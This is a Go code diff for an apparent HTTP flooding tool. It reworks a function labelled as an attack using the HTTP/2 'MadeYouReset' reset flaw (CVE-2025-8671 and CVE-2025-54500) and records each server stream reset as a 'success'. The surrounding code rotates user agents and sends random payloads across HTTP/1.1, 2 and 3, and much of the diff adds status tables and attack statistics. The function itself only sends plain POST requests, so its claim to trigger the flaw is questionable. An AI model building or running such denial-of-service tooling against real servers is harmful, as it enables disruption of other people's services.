@@ -4,6 +4,7 @@ import (
 	"context"
 	"crypto/rand"
 	"crypto/tls"
+	"errors"
 	"flag"
 	"fmt"
 	"io"
@@ -12,6 +13,7 @@ import (
 	"net/http"
 	"net/url"
 	"os"
+	"regexp"
 	"sort"
 	"strings"
 	"sync"
@@ -34,16 +36,19 @@ const (
 )
 
 var (
-	requestsSent    uint64
-	responsesRec    uint64
-	logMessages     []string
-	logMessagesMux  sync.Mutex
-	statusCounts    = make(map[int]uint64)
-	statusCountsMux sync.Mutex
-	currentDelay    int64
-	totalLatency    int64
-	errorTypes      = make(map[string]uint64)
-	errorMux        sync.Mutex
+	requestsSent         uint64
+	responsesRec         uint64
+	logMessages          []string
+	logMessagesMux       sync.Mutex
+	statusCounts         = make(map[string]map[int]uint64) // Protocol -> StatusCode -> Count
+	statusCountsMux      sync.Mutex
+	currentDelay         int64
+	totalLatency         int64
+	errorTypes           = make(map[string]uint64)
+	errorMux             sync.Mutex
+	madeYouResetAttempts uint64
+	madeYouResetSuccess  uint64
+	madeYouResetErrors   uint64
 )
 
 var (
@@ -120,48 +125,6 @@ var statusCodeDescriptions = map[int]string{
 	526: "Invalid SSL Certificate (Cloudflare)", 527: "Railgun Error (Cloudflare)",
 	529: "Site is overloaded", 530: "Site is frozen", 561: "Unauthorized (AWS ELB)",
 	598: "Network Read Timeout Error", 599: "Network Connect Timeout Error",
-	
-	// --- Comprehensive Cloudflare 1xxx Error Codes ---
-	1000: "DNS points to prohibited IP (Cloudflare)",
-	1001: "DNS resolution error (Cloudflare)",
-	1002: "DNS points to prohibited IP (Cloudflare)",
-	1003: "Direct IP Access Not Allowed (Cloudflare)",
-	1004: "Host Not Configured to Serve Web Traffic (Cloudflare)",
-	1005: "IP address has been banned (Cloudflare)",
-	1006: "Access Denied (Cloudflare)",
-	1007: "Access Denied (Cloudflare)",
-	1008: "Access Denied (Cloudflare)",
-	1009: "Country or region banned (Cloudflare)",
-	1010: "Banned based on browser signature (Cloudflare)",
-	1011: "Hotlinking denied (Cloudflare)",
-	1012: "Access Denied (Cloudflare)",
-	1013: "HTTP Hostname and TLS SNI Mismatch (Cloudflare)",
-	1014: "CNAME Cross-User Banned (Cloudflare)",
-	1015: "You are being rate limited (Cloudflare)",
-	1016: "Origin DNS Error (Cloudflare)",
-	1017: "Origin DNS Error (No-op) (Cloudflare)",
-	1018: "Could not find host (Cloudflare)",
-	1019: "Compute server error (Cloudflare)",
-	1020: "Access Denied (Cloudflare)",
-	1023: "Could not find host (Cloudflare)",
-	1025: "Please check back later (Cloudflare)",
-	1033: "Argo Tunnel error (Cloudflare)",
-	1034: "Edge IP Restricted (Cloudflare)",
-	1035: "Invalid request rewrite (invalid URI path) (Cloudflare)",
-	1036: "Invalid request rewrite (maximum length exceeded) (Cloudflare)",
-	1037: "Invalid rewrite rule (expression does not evaluate to a string) (Cloudflare)",
-	1040: "Bad Request (Cloudflare)",
-	1041: "Identity Provider an unknown error has occurred (Cloudflare)",
-	1042: "Managed Ruleset Anomaly Score exceeded (Cloudflare)",
-	1043: "Managed Ruleset Block (Cloudflare)",
-	1044: "Managed Ruleset Log (Cloudflare)",
-	1048: "Invalid API token (Cloudflare)",
-	1101: "Rendering error (Cloudflare)",
-	1102: "Rendering error (Cloudflare)",
-	1104: "A variation of this email address is already taken (Cloudflare)",
-	1105: "Temporary failure, please try again (Cloudflare)",
-	1106: "This page is not available for your account type (Cloudflare)",
-	1200: "Cache connection limit (Cloudflare)",
 }
 
 var (
@@ -171,7 +134,6 @@ var (
 	statusOkColor   = color.New(color.FgGreen)
 	statusWarnColor = color.New(color.FgYellow)
 	statusErrColor  = color.New(color.FgRed)
-	labelColor      = color.New(color.FgWhite)
 )
 
 func getRandomElement(slice []string) string {
@@ -232,8 +194,9 @@ func logMessage(msg string) {
 	logMessagesMux.Lock()
 	defer logMessagesMux.Unlock()
 	logMessages = append(logMessages, time.Now().Format("15:04:05")+" "+msg)
-	if len(logMessages) > 5 {
-		logMessages = logMessages[len(logMessages)-5:]
+	// MODIFIED: Changed log length from 5 to 3.
+	if len(logMessages) > 3 {
+		logMessages = logMessages[len(logMessages)-3:]
 	}
 }
 
@@ -310,7 +273,10 @@ func detectSupportedHTTPVersions(target string, insecureTLS bool) []string {
 	return result
 }
 
-// ENHANCEMENT: More potent "MadeYouReset" attack exploiting HTTP/2 MadeYouReset (CVE-2025-8671).
+// MODIFIED: Reworked the "MadeYouReset" attack to align with the NodeJS reference (CVE-2025-54500).
+// This method now attempts to trigger a server-side RST_STREAM by sending a POST request,
+// aiming to violate protocol rules. A success is recorded when the server resets the stream,
+// which is detected as an http2.StreamError on the client side.
 func madeYouResetAttack(parentCtx context.Context, config *workerConfig, client *http.Client) {
 	select {
 	case <-parentCtx.Done():
@@ -320,35 +286,42 @@ func madeYouResetAttack(parentCtx context.Context, config *workerConfig, client 
 
 	format := getRandomElement(payloadFormats)
 	body, contentType := generateRandomPayload(format)
-	req, err := http.NewRequest("POST", config.targetURL, body)
+	req, err := http.NewRequestWithContext(parentCtx, "POST", config.targetURL, body)
 	if err != nil {
-		return
+		return // Cannot create request, do nothing.
 	}
 	req.Header.Set("User-Agent", getRandomElement(userAgents))
 	req.Header.Set("Cache-Control", "no-store")
 	req.Header.Set("Content-Type", contentType)
 
-	// Create a context that cancels very quickly to simulate a rapid reset.
-	ctx, cancel := context.WithTimeout(parentCtx, time.Duration(50+mathrand.Intn(50))*time.Millisecond)
-	defer cancel()
-
-	req = req.WithContext(ctx)
-
 	atomic.AddUint64(&requestsSent, 1)
+	atomic.AddUint64(&madeYouResetAttempts, 1)
 	resp, err := client.Do(req)
 
 	if err != nil {
-		if err != context.Canceled && err != context.DeadlineExceeded {
-			logMessage(fmt.Sprintf("[H2-RESET] Error: %v", err))
-			recordError("madeyoureset_err")
+		var streamErr http2.StreamError
+		// errors.As checks if the error is or wraps an http2.StreamError. This indicates a server-side reset.
+		if errors.As(err, &streamErr) {
+			// SUCCESS: The server sent RST_STREAM. This is the intended outcome.
+			atomic.AddUint64(&madeYouResetSuccess, 1)
+			logMessage(statusOkColor.Sprintf("[H2-RESET] Success (Server Reset Stream)"))
+		} else if err != context.Canceled {
+			// This is an unexpected network or client error.
+			atomic.AddUint64(&madeYouResetErrors, 1)
+			logMessage(statusErrColor.Sprintf("[H2-RESET] Network Error: %v", err))
 		}
+		// context.Canceled errors are ignored as they typically mean the test is ending.
 	} else if resp != nil {
-		// We don't expect a full response, but if we get one, handle it gracefully.
+		// A response was received, which is not a successful reset attack.
+		// We still process it to record the status code for diagnostics.
 		io.Copy(io.Discard, resp.Body)
 		resp.Body.Close()
 		atomic.AddUint64(&responsesRec, 1)
 		statusCountsMux.Lock()
-		statusCounts[resp.StatusCode]++
+		if _, ok := statusCounts["2"]; !ok { // Hardcode "2" for H2 reset attack
+			statusCounts["2"] = make(map[int]uint64)
+		}
+		statusCounts["2"][resp.StatusCode]++
 		statusCountsMux.Unlock()
 	}
 }
@@ -610,7 +583,10 @@ func worker(ctx context.Context, wg *sync.WaitGroup, config *workerConfig, httpV
 				atomic.AddUint64(&responsesRec, 1)
 
 				statusCountsMux.Lock()
-				statusCounts[resp.StatusCode]++
+				if _, ok := statusCounts[httpVersion]; !ok {
+					statusCounts[httpVersion] = make(map[int]uint64)
+				}
+				statusCounts[httpVersion][resp.StatusCode]++
 				statusCountsMux.Unlock()
 
 				if config.adaptiveDelay {
@@ -682,6 +658,12 @@ func monitor(ctx context.Context, duration time.Duration, config *workerConfig) 
 			}
 		}
 	}
+}
+
+var ansiRegex = regexp.MustCompile("[\u001B\u009B][[\\]()#;?]*(?:(?:[a-zA-Z\\d]*(?:;[a-zA-Z\\d]*)*)?\u0007|(?:\u001B\\[)?[0-9;=?>!]*[ -/]*[@-~])")
+
+func stripAnsi(str string) string {
+	return ansiRegex.ReplaceAllString(str, "")
 }
 
 func printProgress(endTime, startTime time.Time, config *workerConfig) {
@@ -756,29 +738,69 @@ func printProgress(endTime, startTime time.Time, config *workerConfig) {
 
 	sb.WriteString(headerColor.Sprint("---------------------------------------------------------------------------------------------------------------------------------------------------------------\n"))
 	sb.WriteString(headerColor.Sprint("Response Status Counts:\n"))
+
 	statusCountsMux.Lock()
-	keys := make([]int, 0, len(statusCounts))
-	for k := range statusCounts {
-		keys = append(keys, k)
-	}
-	sort.Ints(keys)
-	for _, code := range keys {
-		count := statusCounts[code]
-		statusText, ok := statusCodeDescriptions[code]
-		if !ok {
-			statusText = "Unknown"
+	// Prepare data for each column
+	protocols := []string{"1.1", "2", "3"}
+	protocolData := make(map[string][]string)
+	maxStatusRows := 0
+
+	for _, p := range protocols {
+		var lines []string
+		if protoMap, ok := statusCounts[p]; ok {
+			codes := make([]int, 0, len(protoMap))
+			for code := range protoMap {
+				codes = append(codes, code)
+			}
+			sort.Ints(codes)
+
+			for _, code := range codes {
+				count := protoMap[code]
+				statusText, _ := statusCodeDescriptions[code]
+				var statusColor *color.Color
+				if code >= 200 && code < 300 {
+					statusColor = statusOkColor
+				} else if code >= 400 && code < 500 {
+					statusColor = statusWarnColor
+				} else {
+					statusColor = statusErrColor
+				}
+				lines = append(lines, statusColor.Sprintf("  %d (%s): %d", code, statusText, count))
+			}
 		}
-		var statusColor *color.Color
-		if code >= 200 && code < 300 {
-			statusColor = statusOkColor
-		} else if code >= 400 && code < 500 {
-			statusColor = statusWarnColor
-		} else {
-			statusColor = statusErrColor
+		protocolData[p] = lines
+		if len(lines) > maxStatusRows {
+			maxStatusRows = len(lines)
 		}
-		sb.WriteString(statusColor.Sprintf("  %d (%s): %d\n", code, statusText, count))
 	}
 	statusCountsMux.Unlock()
+
+	// Print headers
+	headers := map[string]string{"1.1": "H1.1:", "2": "H2:", "3": "H3:"}
+	colWidth := 50
+	headerLine := ""
+	for _, p := range protocols {
+		headerLine += fmt.Sprintf("%-*s", colWidth, headers[p])
+	}
+	sb.WriteString(headerColor.Sprint(headerLine + "\n"))
+
+	// Print rows
+	for i := 0; i < maxStatusRows; i++ {
+		rowLine := ""
+		for _, p := range protocols {
+			line := ""
+			if i < len(protocolData[p]) {
+				line = protocolData[p][i]
+			}
+			padding := colWidth - len(stripAnsi(line))
+			if padding < 0 {
+				padding = 0
+			}
+			rowLine += line + strings.Repeat(" ", padding)
+		}
+		sb.WriteString(rowLine + "\n")
+	}
+
 	errorMux.Lock()
 	if len(errorTypes) > 0 {
 		sb.WriteString(headerColor.Sprint("Error Types:\n"))
@@ -789,16 +811,30 @@ func printProgress(endTime, startTime time.Time, config *workerConfig) {
 		sort.Strings(errKeys)
 		for _, k := range errKeys {
 			v := errorTypes[k]
-			sb.WriteString(fmt.Sprintf("  %s: %d\n", k, v))
+			sb.WriteString(statusErrColor.Sprintf("  %s: %d\n", k, v))
 		}
 	}
 	errorMux.Unlock()
+
+	// Add MadeYouReset stats
+	if isH2Active {
+		attempts := atomic.LoadUint64(&madeYouResetAttempts)
+		success := atomic.LoadUint64(&madeYouResetSuccess)
+		errors := atomic.LoadUint64(&madeYouResetErrors)
+
+		sb.WriteString(headerColor.Sprint("H2 MadeYouReset Attack Stats:\n"))
+		sb.WriteString(fmt.Sprintf("  %-20s %d\n", "Attempts:", attempts))
+		sb.WriteString(statusOkColor.Sprintf("  %-20s %d\n", "Successful Resets:", success))
+		sb.WriteString(statusErrColor.Sprintf("  %-20s %d\n", "Errors:", errors))
+	}
+
 	logMessagesMux.Lock()
 	logs := make([]string, len(logMessages))
 	copy(logs, logMessages)
 	logMessagesMux.Unlock()
 	sb.WriteString(headerColor.Sprint("---------------------------------------------------------------------------------------------------------------------------------------------------------------\n"))
-	sb.WriteString(headerColor.Sprint("Log (last 5 events):\n"))
+	// MODIFIED: Changed log title from "5 events" to "3 events".
+	sb.WriteString(headerColor.Sprint("Log (last 3 events):\n"))
 	for i := len(logs) - 1; i >= 0; i-- {
 		sb.WriteString(logs[i] + "\n")
 	}
